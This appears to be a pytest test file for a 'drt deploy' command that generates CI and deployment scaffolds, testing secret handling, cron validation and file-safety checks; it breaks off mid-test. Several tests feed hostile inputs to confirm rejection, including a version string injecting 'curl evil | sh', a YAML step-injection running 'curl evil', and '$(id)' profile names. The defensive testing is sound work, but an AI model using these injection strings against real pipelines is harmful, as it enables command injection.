"""Tests for `drt deploy github-actions` (#785).

The scaffolder scans the project raw (no ${VAR} expansion), infers drt-core
extras from connector types, and enumerates every required secret into the
generated workflow's env block.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest
from typer.testing import CliRunner

from drt.cli.commands.deploy import _TYPE_TO_EXTRA
from drt.cli.main import app

runner = CliRunner()


@pytest.fixture
def project(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Minimal project: snowflake profile, hubspot sync with ${VAR} + *_env."""
    (tmp_path / "drt_project.yml").write_text("name: demo\nprofile: default\n")
    syncs = tmp_path / "syncs"
    syncs.mkdir()
    (syncs / "users_to_hubspot.yml").write_text(
        """
name: users_to_hubspot
model: ref('users')
destination:
  type: hubspot
  object_type: contacts
  token_env: HUBSPOT_TOKEN
sync:
  mode: full
""".lstrip()
    )
    (syncs / "events_to_rest.yml").write_text(
        """
name: events_to_rest
model: ref('events')
destination:
  type: rest_api
  url: "https://${API_HOST}/v1/events"
  auth:
    type: bearer
    token_env: EVENTS_API_TOKEN
sync:
  mode: full
""".lstrip()
    )
    (tmp_path / "profiles.yml").write_text(
        """
default:
  type: snowflake
  account: acme-xy12345
  user: DRT_SERVICE
  password_env: SNOWFLAKE_PASSWORD
  database: ANALYTICS
  warehouse: WH
""".lstrip()
    )
    monkeypatch.chdir(tmp_path)
    return tmp_path


def test_deploy_writes_workflow_with_secrets_and_extras(project: Path) -> None:
    result = runner.invoke(app, ["deploy", "github-actions", "--schedule", "40 3 * * *"])

    assert result.exit_code == 0, result.output
    workflow = (project / ".github/workflows/drt-sync.yml").read_text()

    assert 'cron: "40 3 * * *"' in workflow
    assert "uses: drt-hub/drt-action@v1" in workflow
    assert 'extras: "snowflake"' in workflow  # inferred from profiles.yml
    # Every *_env value and ${VAR} placeholder becomes a wired secret:
    for name in ("HUBSPOT_TOKEN", "EVENTS_API_TOKEN", "SNOWFLAKE_PASSWORD", "API_HOST"):
        assert f"{name}: ${{{{ secrets.{name} }}}}" in workflow
    # Checklist names the secrets for copy-paste:
    assert "gh secret set HUBSPOT_TOKEN" in result.output


def test_deploy_without_schedule_is_dispatch_only(project: Path) -> None:
    result = runner.invoke(app, ["deploy", "github-actions"])

    assert result.exit_code == 0, result.output
    workflow = (project / ".github/workflows/drt-sync.yml").read_text()
    assert "workflow_dispatch:" in workflow
    assert '- cron: "40 3 * * *"' not in workflow.replace('#   - cron: "40 3 * * *"', "")


def test_deploy_rejects_malformed_cron(project: Path) -> None:
    result = runner.invoke(app, ["deploy", "github-actions", "--schedule", "hourly"])
    assert result.exit_code == 1
    assert "5-field cron" in result.output


def test_deploy_dry_run_prints_without_writing(project: Path) -> None:
    result = runner.invoke(app, ["deploy", "github-actions", "--dry-run"])

    assert result.exit_code == 0, result.output
    assert "drt-hub/drt-action@v1" in result.output
    assert not (project / ".github/workflows/drt-sync.yml").exists()


def test_deploy_refuses_overwrite_without_force(project: Path) -> None:
    first = runner.invoke(app, ["deploy", "github-actions"])
    assert first.exit_code == 0

    second = runner.invoke(app, ["deploy", "github-actions"])
    assert second.exit_code == 1
    assert "--force" in second.output

    forced = runner.invoke(app, ["deploy", "github-actions", "--force"])
    assert forced.exit_code == 0


def test_deploy_extras_override_and_options(project: Path) -> None:
    result = runner.invoke(
        app,
        [
            "deploy",
            "github-actions",
            "--extras",
            "postgres,bigquery",
            "--select",
            "tag:nightly",
            "--profile",
            "prd",
        ],
    )

    assert result.exit_code == 0, result.output
    workflow = (project / ".github/workflows/drt-sync.yml").read_text()
    assert 'extras: "postgres,bigquery"' in workflow
    assert 'select: "tag:nightly"' in workflow
    assert 'profile: "prd"' in workflow


def test_deploy_warns_when_repo_profiles_missing(
    project: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (project / "profiles.yml").unlink()

    result = runner.invoke(app, ["deploy", "github-actions"])

    assert result.exit_code == 0, result.output
    assert "profiles.yml" in result.output  # checklist tells the user to commit one


def test_deploy_outside_project_errors(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(tmp_path)
    result = runner.invoke(app, ["deploy", "github-actions"])
    assert result.exit_code == 1
    assert "drt_project.yml" in result.output


def test_extras_mapping_matches_registered_connectors() -> None:
    """Drift guard: every mapped type must be a registered connector type."""
    from drt.connectors import registry

    registered = set(registry._source_registry) | set(registry._destination_registry)
    unknown = set(_TYPE_TO_EXTRA) - registered
    assert not unknown, f"_TYPE_TO_EXTRA references unregistered connector types: {unknown}"


def test_extras_mapping_matches_pyproject_extras() -> None:
    """Drift guard: every mapped extra must exist in pyproject optional-dependencies.

    tomllib is stdlib only from Python 3.11 — skipped on 3.10, where the CI
    matrix still runs this guard on the three newer interpreters.
    """
    tomllib = pytest.importorskip("tomllib")

    pyproject = Path(__file__).resolve().parents[2] / "pyproject.toml"
    with pyproject.open("rb") as f:
        data = tomllib.load(f)
    declared = set(data["project"]["optional-dependencies"])
    unknown = set(_TYPE_TO_EXTRA.values()) - declared
    assert not unknown, f"_TYPE_TO_EXTRA references undeclared extras: {unknown}"


# ---------------------------------------------------------------------------
# Cloud Run Job and Kubernetes CronJob scaffolds (#1225)
# ---------------------------------------------------------------------------


def test_cloud_run_job_writes_valid_scaffold(project: Path) -> None:
    import yaml

    result = runner.invoke(
        app,
        [
            "deploy",
            "cloud-run-job",
            "--schedule",
            "15 4 * * 1-5",
            "--select",
            "tag:nightly",
        ],
    )

    assert result.exit_code == 0, result.output
    root = project / "deploy/cloud-run-job"
    dockerfile = (root / "Dockerfile").read_text()
    job_text = (root / "job.yaml").read_text()
    scheduler = (root / "scheduler.sh").read_text()
    job = yaml.safe_load(job_text)

    assert 'pip install --no-cache-dir "drt-core[snowflake]"' in dockerfile
    assert 'ENTRYPOINT ["drt"]' in dockerfile and 'CMD ["run"]' in dockerfile
    assert job["apiVersion"] == "run.googleapis.com/v1"
    container = job["spec"]["template"]["spec"]["template"]["spec"]["containers"][0]
    assert container["args"] == ["run", "--select", "tag:nightly"]
    env = {item["name"]: item["valueFrom"]["secretKeyRef"] for item in container["env"]}
    for name in ("HUBSPOT_TOKEN", "EVENTS_API_TOKEN", "SNOWFLAKE_PASSWORD", "API_HOST"):
        assert env[name] == {"name": name, "key": "latest"}  # secret name, then version
    assert "--schedule='15 4 * * 1-5'" in scheduler
    for text in (dockerfile, job_text, scheduler):
        assert "Generated by `drt deploy cloud-run-job`" in text
        assert "Regenerate" in text and "--force" in text


def test_cloud_run_drt_version_pins_the_install_only_when_given(project: Path) -> None:
    unpinned = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])
    assert unpinned.exit_code == 0, unpinned.output
    root = project / "deploy/cloud-run-job"
    assert 'pip install --no-cache-dir "drt-core[snowflake]"' in (root / "Dockerfile").read_text()

    pinned = runner.invoke(
        app,
        ["deploy", "cloud-run-job", "--schedule", "0 6 * * *", "--drt-version", "1.2.1", "--force"],
    )
    assert pinned.exit_code == 0, pinned.output
    assert '"drt-core[snowflake]==1.2.1"' in (root / "Dockerfile").read_text()


@pytest.mark.parametrize(
    "bad", ["latest", '1.2.1"; curl evil | sh #', "1.2.1 --pre", ">=1.0", "1.2.1\n"]
)
def test_cloud_run_drt_version_rejects_anything_but_a_release_version(
    project: Path, bad: str
) -> None:
    result = runner.invoke(
        app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *", "--drt-version", bad]
    )

    assert result.exit_code == 1
    assert not (project / "deploy/cloud-run-job").exists()


def test_cloud_run_scaffold_is_deterministic_and_refuses_partial_overwrite(
    project: Path,
) -> None:
    args = ["deploy", "cloud-run-job", "--schedule", "40 3 * * *"]
    assert runner.invoke(app, args).exit_code == 0
    root = project / "deploy/cloud-run-job"
    before = {path.name: path.read_bytes() for path in sorted(root.iterdir())}

    refused = runner.invoke(app, args)
    assert refused.exit_code == 1 and "--force" in refused.output
    assert before == {path.name: path.read_bytes() for path in sorted(root.iterdir())}

    forced = runner.invoke(app, [*args, "--force"])
    assert forced.exit_code == 0, forced.output
    assert before == {path.name: path.read_bytes() for path in sorted(root.iterdir())}


def test_k8s_cronjob_writes_hardened_valid_manifest(project: Path) -> None:
    import yaml

    result = runner.invoke(
        app,
        [
            "deploy",
            "k8s-cronjob",
            "--schedule",
            "0 */6 * * *",
            "--select",
            "destination:hubspot",
        ],
    )

    assert result.exit_code == 0, result.output
    text = (project / "deploy/k8s-cronjob.yml").read_text()
    manifest = yaml.safe_load(text)
    spec = manifest["spec"]
    job_spec = spec["jobTemplate"]["spec"]
    pod_spec = job_spec["template"]["spec"]
    container = pod_spec["containers"][0]

    assert manifest["apiVersion"] == "batch/v1"
    assert spec["schedule"] == "0 */6 * * *"
    assert spec["concurrencyPolicy"] == "Forbid"
    assert job_spec["activeDeadlineSeconds"] == 3600
    assert container["args"] == ["run", "--select", "destination:hubspot"]
    assert container["resources"]["requests"] == {"cpu": "100m", "memory": "256Mi"}
    assert pod_spec["securityContext"]["runAsNonRoot"] is True
    assert container["securityContext"]["readOnlyRootFilesystem"] is True
    env = {item["name"]: item["valueFrom"]["secretKeyRef"] for item in container["env"]}
    assert env["HUBSPOT_TOKEN"] == {"name": "drt-secrets", "key": "HUBSPOT_TOKEN"}
    assert "Generated by `drt deploy k8s-cronjob`" in text


def test_k8s_cronjob_refuses_overwrite_without_force(project: Path) -> None:
    args = ["deploy", "k8s-cronjob", "--schedule", "40 3 * * *"]
    assert runner.invoke(app, args).exit_code == 0

    refused = runner.invoke(app, args)
    assert refused.exit_code == 1 and "--force" in refused.output
    assert runner.invoke(app, [*args, "--force"]).exit_code == 0


@pytest.mark.parametrize("command", ["github-actions", "cloud-run-job", "k8s-cronjob"])
@pytest.mark.parametrize(
    "schedule",
    ["hourly", "0 0 * * *\nmalicious", '0 0 * * *"', "0 0 * * *;touch"],
)
def test_deploy_scaffolds_reject_unsafe_schedules(
    project: Path, command: str, schedule: str
) -> None:
    result = runner.invoke(app, ["deploy", command, "--schedule", schedule])

    assert result.exit_code == 1
    assert "5-field cron" in result.output


@pytest.mark.parametrize("command", ["github-actions", "cloud-run-job", "k8s-cronjob"])
@pytest.mark.parametrize(
    "select",
    ["tag:nightly\nmalicious", 'tag:nightly"', "tag:nightly weekly", "source:warehouse"],
)
def test_deploy_scaffolds_reject_unsafe_selectors(project: Path, command: str, select: str) -> None:
    args = ["deploy", command, "--select", select]
    if command != "github-actions":
        args += ["--schedule", "40 3 * * *"]
    result = runner.invoke(app, args)

    assert result.exit_code == 1
    assert "safe selector" in result.output


def test_deploy_scaffolds_never_copy_literal_secret_values(project: Path) -> None:
    marker = "literal-secret-value-must-not-leak"
    with (project / "syncs/users_to_hubspot.yml").open("a") as sync_file:
        sync_file.write(f"description: {marker}\n")

    assert (
        runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "40 3 * * *"]).exit_code == 0
    )
    assert runner.invoke(app, ["deploy", "k8s-cronjob", "--schedule", "40 3 * * *"]).exit_code == 0

    for path in (project / "deploy").rglob("*"):
        if path.is_file():
            assert marker not in path.read_text()


# ---------------------------------------------------------------------------
# --with-plan: the pull-request review loop (#1219)
# ---------------------------------------------------------------------------


def _scaffold(*args: str) -> tuple[dict, dict, str, str]:
    import yaml

    result = runner.invoke(app, ["deploy", "github-actions", "--with-plan", *args])
    assert result.exit_code == 0, result.output
    plan_text = Path(".github/workflows/drt-plan.yml").read_text()
    apply_text = Path(".github/workflows/drt-apply.yml").read_text()
    return yaml.safe_load(plan_text), yaml.safe_load(apply_text), plan_text, apply_text


def _on(workflow: dict) -> dict:
    # PyYAML reads the bare key `on` as the boolean True.
    return workflow.get("on") or workflow[True]  # type: ignore[no-any-return]


def test_with_plan_writes_two_valid_workflows(project: Path) -> None:
    plan, apply_, _, _ = _scaffold()

    assert plan["name"] == "drt plan" and apply_["name"] == "drt apply"
    assert "pull_request" in _on(plan)
    assert _on(apply_)["push"]["branches"] == ["main"]
    assert "workflow_dispatch" in _on(apply_)


def test_plan_workflow_skips_fork_prs_and_never_uses_pull_request_target(project: Path) -> None:
    plan, _, plan_text, apply_text = _scaffold()

    job = plan["jobs"]["plan"]
    assert job["if"] == "github.event.pull_request.head.repo.full_name == github.repository"
    assert "pull_request_target:" not in plan_text and "pull_request_target:" not in apply_text
    assert plan["permissions"] == {"contents": "read", "pull-requests": "write"}


def test_plan_workflow_plans_everything_and_keeps_one_sticky_comment(project: Path) -> None:
    _, _, plan_text, _ = _scaffold()

    assert "drt plan --all --out-dir plans --output markdown" in plan_text
    assert "<!-- drt-plan -->" in plan_text
    assert "[:60000]" in plan_text  # GitHub's comment size limit, cut on a character boundary
    assert '.user.login == "github-actions[bot]"' in plan_text  # only our own comment
    assert "name: drt-plans" in plan_text


def test_both_workflows_carry_the_plan_key_and_the_project_secrets(project: Path) -> None:
    plan, apply_, plan_text, apply_text = _scaffold()

    for text in (plan_text, apply_text):
        assert "DRT_PLAN_KEY: ${{ secrets.DRT_PLAN_KEY }}" in text
        assert "HUBSPOT_TOKEN: ${{ secrets.HUBSPOT_TOKEN }}" in text
        assert "SNOWFLAKE_PASSWORD: ${{ secrets.SNOWFLAKE_PASSWORD }}" in text
    assert 'pip install "drt-core[snowflake]"' in plan_text


def test_apply_workflow_serialises_and_finds_the_reviewed_plan(project: Path) -> None:
    _, apply_, _, apply_text = _scaffold()

    assert apply_["concurrency"] == {
        "group": "drt-apply",
        "cancel-in-progress": False,
        "queue": "max",  # without it GitHub keeps one pending run and cancels the rest
    }
    assert apply_["permissions"]["actions"] == "read"
    assert "--workflow drt-plan.yml" in apply_text
    assert "gh run download" in apply_text
    assert 'drt apply plans --auto-approve --max-age 7d --approved-by "$APPROVER"' in apply_text
    # Nothing is applied unless a reviewed plan was found.
    assert "steps.plan.outputs.run_id != ''" in apply_text


def test_redact_keys_and_max_age_thread_through(project: Path) -> None:
    _, _, plan_text, apply_text = _scaffold("--redact-keys", "--max-age", "48h")

    assert "--output markdown --redact-keys > plan-comment.md" in plan_text
    assert "--max-age 48h" in apply_text


def test_with_plan_rejects_a_bad_max_age_and_existing_files(project: Path) -> None:
    bad = runner.invoke(app, ["deploy", "github-actions", "--with-plan", "--max-age", "soon"])
    assert bad.exit_code == 1 and "--max-age" in bad.output

    assert runner.invoke(app, ["deploy", "github-actions", "--with-plan"]).exit_code == 0
    again = runner.invoke(app, ["deploy", "github-actions", "--with-plan"])
    assert again.exit_code == 1 and "already exists" in again.output
    assert runner.invoke(app, ["deploy", "github-actions", "--with-plan", "--force"]).exit_code == 0


def test_with_plan_dry_run_prints_both_files_verbatim(project: Path) -> None:
    result = runner.invoke(app, ["deploy", "github-actions", "--with-plan", "--dry-run"])

    assert result.exit_code == 0
    assert "branches: [main]" in result.output  # rich markup would have eaten "[main]"
    assert "# .github/workflows/drt-plan.yml" in result.output
    assert not Path(".github/workflows/drt-plan.yml").exists()


def test_next_steps_tell_the_user_to_create_the_shared_plan_key(project: Path) -> None:
    result = runner.invoke(app, ["deploy", "github-actions", "--with-plan"])

    assert "openssl rand -hex 32 | gh secret set DRT_PLAN_KEY" in result.output
    assert "gh secret set HUBSPOT_TOKEN" in result.output
    assert "forks" in result.output


def test_with_plan_without_a_profiles_file_says_how_to_stage_one(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (tmp_path / "drt_project.yml").write_text("name: demo\nprofile: default\n")
    (tmp_path / "syncs").mkdir()
    monkeypatch.chdir(tmp_path)

    result = runner.invoke(app, ["deploy", "github-actions", "--with-plan"])

    assert result.exit_code == 0, result.output
    assert "Commit a profiles.yml" in result.output
    assert (
        "No profiles.yml at the project root" in Path(".github/workflows/drt-plan.yml").read_text()
    )
    assert "gh secret set DRT_PLAN_KEY" in result.output


def test_with_plan_stages_the_profile_when_one_is_committed(project: Path) -> None:
    _scaffold()

    assert (
        "cp profiles.yml ~/.drt/profiles.yml" in Path(".github/workflows/drt-plan.yml").read_text()
    )


def test_a_missing_reviewed_plan_fails_the_apply_job_instead_of_passing(project: Path) -> None:
    _, _, _, apply_text = _scaffold()

    # Every refusal path is red, never a quiet success: no key, an unverifiable run id,
    # an unmerged PR, no pull request, no successful plan run.
    assert apply_text.count("::error::") == 5
    assert "::warning::" not in apply_text and "::notice::" not in apply_text
    assert apply_text.count("exit 1") >= 2


def test_the_comment_step_runs_even_when_planning_failed(project: Path) -> None:
    plan, _, _, _ = _scaffold()

    comment = next(s for s in plan["jobs"]["plan"]["steps"] if "comment" in s.get("name", ""))
    assert comment["if"].startswith("always()")


def test_the_generated_comment_truncation_never_splits_a_character(
    project: Path, tmp_path: Path
) -> None:
    import re
    import subprocess
    import sys

    _, _, plan_text, _ = _scaffold()
    snippet = re.search(r"python3 - <<'PY'\n(.*?)\n\s*PY\n", plan_text, re.S)
    assert snippet is not None
    code = "\n".join(line.strip() for line in snippet.group(1).splitlines())
    work = tmp_path / "work"
    work.mkdir()
    (work / "plan-comment.md").write_bytes("\u3042".encode() * 30000)  # 3 bytes each, 90,000 bytes

    subprocess.run([sys.executable, "-c", code], cwd=work, check=True)

    out = (work / "comment.md").read_bytes()
    assert len(out) <= 60000 and len(out) % 3 == 0
    out.decode("utf-8")  # raises if a character was cut in half


def test_the_apply_job_only_runs_on_main_and_checks_the_plan_key_first(project: Path) -> None:
    plan, apply_, plan_text, apply_text = _scaffold()

    assert apply_["jobs"]["apply"]["if"] == "github.ref == 'refs/heads/main'"
    for workflow, job in ((plan, "plan"), (apply_, "apply")):
        steps = [s.get("name", "") for s in workflow["jobs"][job]["steps"]]
        key_check = steps.index("Check the plan key")
        assert key_check < max(
            steps.index(n) for n in steps if "Plan every" in n or "Find the" in n
        )
    assert 'if [ -z "$DRT_PLAN_KEY" ]' in plan_text and 'if [ -z "$DRT_PLAN_KEY" ]' in apply_text


def test_the_generated_text_does_not_promise_a_transaction(project: Path) -> None:
    result = runner.invoke(app, ["deploy", "github-actions", "--with-plan"])
    apply_text = Path(".github/workflows/drt-apply.yml").read_text()

    assert "not a transaction" in apply_text
    assert "exactly what was reviewed" not in apply_text + result.output


def _fake_gh(tmp_path: Path, **answers: str) -> Path:
    """A `gh` that answers from environment variables, so the generated bash can run offline."""
    script = tmp_path / "bin" / "gh"
    script.parent.mkdir(exist_ok=True)
    script.write_text(
        """#!/usr/bin/env bash
case "$1 $2" in
  "run view") printf '%s' "$FAKE_RUN_META" ;;
  "run list") printf '%s' "$FAKE_RUN_LIST" ;;
  "run download") mkdir -p plans ;;
  "pr view")
    case "$*" in
      *headRefOid*) printf '%s' "$FAKE_PR_HEAD" ;;
      *) printf '%s' "$FAKE_MERGER" ;;
    esac ;;
  api*)
    case "$*" in
      *"$FAKE_META_SHA"*) printf '%s' "$FAKE_PR_BY_META" ;;
      *) printf '%s' "$FAKE_PR_BY_PUSH" ;;
    esac ;;
esac
"""
    )
    script.chmod(0o755)
    return script


def _run_find_plan(tmp_path: Path, env_extra: dict[str, str]) -> tuple[int, str, str]:
    import os
    import subprocess

    from drt.cli.commands.deploy import _FIND_PLAN_SCRIPT

    _fake_gh(tmp_path)
    out = tmp_path / "gh_output"
    out.write_text("")
    env = {
        "PATH": f"{tmp_path / 'bin'}:{os.environ['PATH']}",
        "REPO": "o/r",
        "SHA": "mergesha",
        "ACTOR": "alice",
        "GITHUB_OUTPUT": str(out),
        "FAKE_META_SHA": "headsha",
        **env_extra,
    }
    done = subprocess.run(
        ["bash", "-c", _FIND_PLAN_SCRIPT],
        cwd=tmp_path,
        env=env,
        capture_output=True,
        text=True,
    )
    return done.returncode, done.stdout + done.stderr, out.read_text()


def test_a_hand_typed_run_id_must_be_a_successful_pr_plan_run_of_a_merged_pr(
    tmp_path: Path,
) -> None:
    good = "drt plan\tpull_request\tsuccess\theadsha"
    base = {"PLAN_RUN_ID": "42", "FAKE_PR_BY_META": "7"}

    ok = _run_find_plan(tmp_path, {**base, "FAKE_RUN_META": good})
    assert ok[0] == 0 and "run_id=42" in ok[2]
    assert "manual run by alice of plan run 42 (PR #7)" in ok[2]

    for bad in (
        "drt apply\tpull_request\tsuccess\theadsha",  # a different workflow
        "drt plan\tworkflow_dispatch\tsuccess\theadsha",  # not a pull-request run
        "drt plan\tpull_request\tfailure\theadsha",  # a failed plan
    ):
        code, text, written = _run_find_plan(tmp_path, {**base, "FAKE_RUN_META": bad})
        assert code == 1 and "not a successful pull-request run" in text and written == ""


def test_a_hand_typed_run_id_for_an_unmerged_branch_is_refused(tmp_path: Path) -> None:
    code, text, written = _run_find_plan(
        tmp_path,
        {
            "PLAN_RUN_ID": "42",
            "FAKE_RUN_META": "drt plan\tpull_request\tsuccess\theadsha",
            "FAKE_PR_BY_META": "",  # no merged pull request contains that commit
        },
    )

    assert code == 1 and "not part of a pull request merged into main" in text
    assert written == ""


def test_the_push_path_applies_only_the_merged_prs_reviewed_plan(tmp_path: Path) -> None:
    ok = _run_find_plan(
        tmp_path,
        {
            "FAKE_PR_BY_PUSH": "9",
            "FAKE_PR_HEAD": "headsha",
            "FAKE_RUN_LIST": "555",
            "FAKE_MERGER": "bob",
        },
    )
    assert ok[0] == 0 and "run_id=555" in ok[2] and "merge of PR #9 by @bob" in ok[2]

    no_pr = _run_find_plan(tmp_path, {"FAKE_PR_BY_PUSH": ""})
    assert no_pr[0] == 1 and "without a pull request" in no_pr[1]

    no_run = _run_find_plan(
        tmp_path, {"FAKE_PR_BY_PUSH": "9", "FAKE_PR_HEAD": "headsha", "FAKE_RUN_LIST": ""}
    )
    assert no_run[0] == 1 and "No successful drt plan run" in no_run[1]


# ---------------------------------------------------------------------------
# Hardening from the adversarial review (#1291)
# ---------------------------------------------------------------------------


def test_the_dockerfile_copies_only_the_project_definition(project: Path) -> None:
    (project / ".env").write_text("TOKEN=env-file-secret-marker\n")
    (project / ".drt").mkdir()
    (project / ".drt" / "secrets.toml").write_text("k = 'toml-secret-marker'\n")

    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])

    assert result.exit_code == 0, result.output
    dockerfile = (project / "deploy/cloud-run-job/Dockerfile").read_text()
    copies = [line for line in dockerfile.splitlines() if line.startswith("COPY")]
    assert copies == [
        "COPY drt_project.yml /app/drt_project.yml",
        "COPY syncs /app/syncs",
        "COPY profiles.yml /home/drt/.drt/profiles.yml",
    ]
    # The exact COPY list above is the guarantee; the markers never appear in the file either.
    assert "env-file-secret-marker" not in dockerfile and "toml-secret-marker" not in dockerfile


def test_remote_state_backends_add_their_storage_extra(project: Path) -> None:
    (project / "drt_project.yml").write_text(
        "name: demo\nprofile: default\nstate:\n  backend: gcs\n  bucket: b\n"
    )

    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])

    assert result.exit_code == 0, result.output
    dockerfile = (project / "deploy/cloud-run-job/Dockerfile").read_text()
    assert "gcs" in dockerfile.split("pip install", 1)[1].splitlines()[0]


@pytest.mark.parametrize("selector", ["state:modified", "state:new"])
def test_state_selectors_are_refused_because_the_job_would_need_a_baseline(
    project: Path, selector: str
) -> None:
    for command in ("cloud-run-job", "k8s-cronjob"):
        result = runner.invoke(
            app, ["deploy", command, "--schedule", "0 6 * * *", "--select", selector]
        )
        assert result.exit_code == 1 and "--state" in result.output


def test_a_hostile_env_name_never_reaches_the_workflow(project: Path) -> None:
    (project / "syncs" / "evil.yml").write_text(
        "name: evil\nmodel: ref('x')\ndestination:\n  type: hubspot\n  object_type: contacts\n"
        '  token_env: "SAFE: ${{ secrets.SAFE }}\\n      - name: Pwn\\n        run: curl evil"\n'
        "sync:\n  mode: full\n"
    )

    result = runner.invoke(app, ["deploy", "github-actions"])

    assert result.exit_code == 0, result.output
    workflow = (project / ".github/workflows/drt-sync.yml").read_text()
    assert "Pwn" not in workflow and "curl evil" not in workflow


@pytest.mark.parametrize("profile", ['x"\n      - run: id', "a b", "$(id)", "a;b"])
def test_a_hostile_profile_name_is_refused(project: Path, profile: str) -> None:
    result = runner.invoke(app, ["deploy", "github-actions", "--profile", profile])

    assert result.exit_code == 1
    assert not (project / ".github").exists()


def test_a_symlinked_output_directory_is_refused(project: Path, tmp_path_factory: Any) -> None:
    outside = tmp_path_factory.mktemp("outside")
    (project / "deploy").mkdir()
    (project / "deploy" / "cloud-run-job").symlink_to(outside, target_is_directory=True)

    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])

    assert result.exit_code == 1 and "symlink" in result.output
    assert list(outside.iterdir()) == []


def test_force_never_overwrites_through_a_symlinked_file(
    project: Path, tmp_path_factory: Any
) -> None:
    victim = tmp_path_factory.mktemp("victim") / "important.txt"
    victim.write_text("keep me")
    target = project / ".github" / "workflows" / "drt-sync.yml"
    target.parent.mkdir(parents=True)
    target.symlink_to(victim)

    result = runner.invoke(app, ["deploy", "github-actions", "--force"])

    assert result.exit_code == 1 and "symlink" in result.output
    assert victim.read_text() == "keep me"


def test_an_output_path_outside_the_project_is_refused(
    project: Path, tmp_path_factory: Any
) -> None:
    outside = tmp_path_factory.mktemp("elsewhere") / "cron.yml"

    result = runner.invoke(
        app, ["deploy", "k8s-cronjob", "--schedule", "0 6 * * *", "--output", str(outside)]
    )

    assert result.exit_code == 1 and "outside the project" in result.output
    assert not outside.exists()


@pytest.mark.parametrize(
    "schedule",
    ["99 99 99 99 99", "1--2 * * * *", "61 * * * *", "* 24 * * *", "* * 0 * *", "5-1 * * * *"],
)
def test_cron_expressions_must_be_valid_not_just_safe(project: Path, schedule: str) -> None:
    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", schedule])

    assert result.exit_code == 1


@pytest.mark.parametrize(
    "schedule", ["*/15 * * * *", "0 6 * * MON-FRI", "30 2 1 JAN,JUL *", "0 0 * * 7"]
)
def test_ordinary_cron_expressions_still_pass(project: Path, schedule: str) -> None:
    assert runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", schedule]).exit_code == 0


# ---------------------------------------------------------------------------
# Second adversarial round (#1291)
# ---------------------------------------------------------------------------


def test_project_file_env_references_become_runtime_secrets(project: Path) -> None:
    (project / "drt_project.yml").write_text(
        "name: demo\nprofile: default\nstate:\n  backend: s3\n  bucket: b\n"
        "  aws_secret_access_key_env: DRT_STATE_SECRET\n"
    )

    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])

    assert result.exit_code == 0, result.output
    assert "DRT_STATE_SECRET" in (project / "deploy/cloud-run-job/job.yaml").read_text()
    assert "s3" in (project / "deploy/cloud-run-job/Dockerfile").read_text()


def test_literal_credentials_in_project_yaml_refuse_the_image_build(project: Path) -> None:
    secret = "hunter2-must-not-be-printed"
    (project / "syncs" / "leaky.yml").write_text(
        "name: leaky\nmodel: ref('x')\ndestination:\n  type: hubspot\n  object_type: contacts\n"
        f"  token: {secret}\nsync:\n  mode: full\n"
    )

    refused = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])

    assert refused.exit_code == 1 and "leaky.yml: destination.token" in refused.output
    assert secret not in refused.output  # the location is named, never the value
    assert not (project / "deploy").exists()  # a refusal writes nothing at all

    allowed = runner.invoke(
        app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *", "--allow-inline-secrets"]
    )
    assert allowed.exit_code == 0 and (project / "deploy/cloud-run-job/Dockerfile").exists()


def test_env_references_and_provider_uris_are_not_flagged_as_inline_secrets(project: Path) -> None:
    (project / "syncs" / "ok.yml").write_text(
        "name: ok\nmodel: ref('x')\ndestination:\n  type: hubspot\n  object_type: contacts\n"
        "  token: gcp-sm://projects/p/secrets/s\nsync:\n  mode: full\n"
    )

    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])

    assert result.exit_code == 0, result.output
    assert "gcp-secrets" in (project / "deploy/cloud-run-job/Dockerfile").read_text()


def test_a_hard_linked_scaffold_file_is_replaced_not_modified(
    project: Path, tmp_path_factory: Any
) -> None:
    """The file is swapped for a fresh one, so the other name of the shared inode is untouched."""
    import os

    outside = tmp_path_factory.mktemp("shared") / "shared.txt"
    outside.write_text("keep me")
    target = project / ".github" / "workflows" / "drt-sync.yml"
    target.parent.mkdir(parents=True)
    os.link(outside, target)

    result = runner.invoke(app, ["deploy", "github-actions", "--force"])

    assert result.exit_code == 0, result.output
    assert outside.read_text() == "keep me"
    assert "drt sync" in target.read_text() and target.stat().st_nlink == 1


def test_a_fifo_in_the_way_never_hangs_the_command(project: Path) -> None:
    import os

    target = project / ".github" / "workflows" / "drt-sync.yml"
    target.parent.mkdir(parents=True)
    os.mkfifo(target)

    result = runner.invoke(app, ["deploy", "github-actions", "--force"])

    assert result.exit_code == 0, result.output  # replaced by a regular file, never opened
    assert target.is_file() and not target.is_fifo()


def test_a_failure_while_staging_leaves_every_existing_file_untouched(
    project: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import os

    root = project / "deploy" / "cloud-run-job"
    root.mkdir(parents=True)
    for name in ("Dockerfile", "job.yaml", "scheduler.sh"):
        (root / name).write_text(f"old {name}")
    real_open = os.open
    calls = {"n": 0}

    def flaky_open(path: Any, flags: int, mode: int = 0o600) -> int:
        calls["n"] += 1
        if calls["n"] == 3:  # the third staged file cannot be created
            raise PermissionError(13, "Permission denied")
        return real_open(path, flags, mode)

    monkeypatch.setattr("drt.cli.commands.deploy.os.open", flaky_open)

    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *", "--force"])

    assert result.exit_code == 1
    for name in ("Dockerfile", "job.yaml", "scheduler.sh"):
        assert (root / name).read_text() == f"old {name}"
    assert not list(root.glob(".*.tmp"))


def test_without_force_a_file_that_appears_late_is_not_clobbered(
    project: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import os

    target = project / ".github" / "workflows" / "drt-sync.yml"
